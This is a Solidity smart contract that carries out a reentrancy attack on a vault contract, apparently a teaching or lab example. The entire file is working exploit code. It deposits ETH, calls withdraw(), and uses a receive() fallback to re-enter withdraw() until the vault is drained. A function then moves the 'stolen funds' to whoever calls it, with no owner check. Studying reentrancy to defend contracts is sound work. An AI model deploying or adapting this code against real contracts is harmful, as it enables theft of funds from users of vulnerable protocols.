// SPDX-License-Identifier: MIT
pragma solidity ^0.8.28;

interface IVulnerableVault {
    function deposit() external payable;
    function withdraw() external;
}

contract ReentrancyAttack {
    IVulnerableVault public vault;
    uint256 public initialDeposit;

    constructor(address _vaultAddress) {
        vault = IVulnerableVault(_vaultAddress);
    }

    // Function to initiate the attack: deposit some ETH and start withdrawing
    function attack() external payable {
        require(msg.value > 0, "Must deposit some ETH");
        initialDeposit = msg.value;
        vault.deposit{value: msg.value}();
        vault.withdraw();
    }

    // Fallback function to reenter the withdraw repeatedly
    receive() external payable {
        // Check if the vault still has balance to drain (to avoid infinite loop)
        if (address(vault).balance >= initialDeposit) {
            vault.withdraw();
        }
    }

    // Function to withdraw the stolen funds from this contract
    function withdrawFunds() external {
        payable(msg.sender).transfer(address(this).balance);
    }
}